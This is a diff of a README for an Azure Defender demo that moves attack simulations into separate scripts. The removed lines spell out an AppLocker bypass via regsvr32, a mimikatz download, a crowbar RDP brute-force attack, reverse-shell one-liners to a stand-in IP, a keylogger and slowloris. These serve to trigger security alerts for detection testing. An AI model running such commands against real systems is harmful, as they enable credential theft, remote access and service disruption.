@@ -20,67 +20,23 @@ Check vulnerabilities found in VMs (by Qualys engine), container images, storage
 - Blueprints
 
 ## Threat protection and automation
+### Host level protection
+First let's simulate couple of attacks.
 
-### Windows Host level protection
+We can invoke PowerShell script in Windows VM via Azure PowerShell command.
+
 ```powershell
 Invoke-AzVMRunCommand -ResourceGroupName 'azdefender' -VMName 'azdefender-vm' -CommandId 'RunPowerShellScript' -ScriptPath 'scripts/infraAttackSimulationFromWindows.ps1' 
 ```
 
-
-Search for alerts such as suspicious process or RDP attack.
-
-To generate some alerts, you can run the following on monitored VM.
+Also invoke Bash script on Linux node. Script is downloaded already in /scripts folder and you can run it by using Bastion to connect to server or using az command.
 
 ```powershell
-# Create file with malware test content
-'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | Out-File EICAR.com
-
-# Copy svchost.exe to non-standard location and execute it
-Copy-Item -Path C:\Windows\System32\svchost.exe C:\
-C:\svchost.exe
-
-# Download and expand mimikatz
-https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
-$WebClient = New-Object System.Net.WebClient
-$WebClient.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip","c:\install\mimikatz_trunk.zip")
-cd c:\install
-Expand-Archive -LiteralPath 'c:\install\mimikatz_trunk.zip'
-
-# Attempt to bypass App Locker
-echo '<?XML version="1.0"?>' | Out-File test.sct
-echo '<scriptlet>' | Out-File -Append test.sct
-echo '<registration' | Out-File -Append test.sct
-echo ' progid="TESTING"' | Out-File -Append test.sct
-echo ' classid="{A1112221-0000-0000-3000-000DA00DABFC}" >' | Out-File -Append test.sct
-echo ' <script language="JScript">' | Out-File -Append test.sct
-echo ' <![CDATA[' | Out-File -Append test.sct
-echo ' var foo = new ActiveXObject("WScript.Shell").Run("powershell.exe InvokeWebRequest -OutFile eicar.com http://www.eicar.org/download/eicar.com");' | Out-File -Append test.sct
-echo ' ]]>' | Out-File -Append test.sct
-echo '</script>' | Out-File -Append test.sct
-echo '</registration>' | Out-File -Append test.sct
-echo '</scriptlet>' | Out-File -Append test.sct
-regsvr32.exe /s /u /i:test.sct scrobj.dll
+az vm run-command invoke -g azdefender -n azdefender-linux-vm --command-id RunShellScript --scripts "sudo bash /scripts/infraAttackSimulationFromLinux.sh | sudo tee /scripts/infraAttackSimulation.log"
 ```
 
-From Linux machine initiate RDP brute force attack. 
-
-```bash
-# Download 500 worst passwords dictionary
-wget http://downloads.skullsecurity.org/passwords/500-worst-passwords.txt.bz2
-bzip2 -d 500-worst-passwords.txt.bz2
-
-# Install crowbar and run RDP dictionary attack
-sudo apt install -y ubuntu-desktop nmap openvpn freerdp-x11 tigervnc-viewer python3 python3-pip
-
-git clone https://github.com/galkan/crowbar
-cd crowbar/
-pip3 install -r requirements.txt
-
-./crowbar.py -b rdp -u administrator -C ../500-worst-passwords.txt -s 10.0.0.4/32 -v -D -n1
-./crowbar.py -b rdp -u tomas -C ../500-worst-passwords.txt -s 10.0.0.4/32 -v -D -n 1
-./crowbar.py -b rdp -u tomas -c Azure12345678 -s 10.0.0.4/32 -v -D -n 1
-```
+#### Windows protection
+Search for alerts such as suspicious process or RDP attack. You can check out [scripts](./scripts/) to understand how attack simulations work.
 
 Use automation to isolate RDP access (Logic App with NSG). Before running this demo go to connectors or inside Logic App and authorize connections to Office365.
 
@@ -114,27 +70,8 @@ $nsg | Add-AzNetworkSecurityRuleConfig -Name "DenyAllRdp" -Description "Deny all
 $nsg | Set-AzNetworkSecurityGroup
 ```
 
-### Linux Host level protection
-Generate suspicious activity on Linux VM.
-
-```bash
-# Attempt to create revese shell
-nc -e /bin/bash 1.2.3.4 1234
-bash -i>& /dev/tcp/1.2.3.4/1234 0>&1
-
-# Add and remove kernel module
-# sudo insmod /lib/modules/5.4.0-1031-azure/kernel/drivers/firewire/nosy.ko 
-# sudo rmmod /lib/modules/5.4.0-1031-azure/kernel/drivers/firewire/nosy.ko 
-
-# Run questionable tools
-logkeys --start
-perl slowloris.pl -dns server.contoso.com
-
-# Store malware file
-echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > ./EICAR.com
-```
-
-Check alert in Azure Defender.
+#### Linux Host level protection
+Check alerts in Azure Defender. You can check out [scripts](./scripts/) to understand how attack simulations work.
 
 ### Storage protection
 As per demo install instructions (README.md) we have already uploaded EICAR test malware file to blob storage.
